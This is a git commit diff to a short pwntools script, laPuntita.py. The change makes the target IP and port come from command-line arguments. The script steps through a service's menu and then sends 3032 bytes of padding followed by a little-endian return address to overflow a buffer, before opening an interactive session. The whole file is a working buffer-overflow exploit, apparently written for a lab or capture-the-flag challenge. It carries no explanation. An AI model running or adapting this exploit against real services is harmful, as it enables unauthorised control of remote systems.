5f91b746160b03fb39393cb57fef85823d46f274
Miguel Tapiz Martín <144665951+migueltapiz@users.noreply.github.com>
2023-12-14 18:26:57 +0100

    Add files via upload

--- laPuntita.py
+++ laPuntita.py
@@ -1,11 +1,22 @@
 from pwn import *
+import sys
 
-r = remote('192.168.1.1', 42123)
+if len(sys.argv) != 3:
+    print("Usage: python script.py <IP> <PUERTO> ")
+    sys.exit(1)
+
+arg1 = sys.argv[1]
+arg2 = sys.argv[2]
+
+
+r = remote(arg1, int(arg2)) # Quiero que se reciba los argumentos por terminal
 
 r.send("1\na\na\n")
 r.send("2\na\na\n")
 r.send("2\n")
-r.send("B"*3032, end="")
-r.send("\x6e\x32\x40\x00")
+a = "B"*3032
+b = a + "\x6e\x32\x40\x00\n"
 
+r.send(b)
 r.interactive()
+
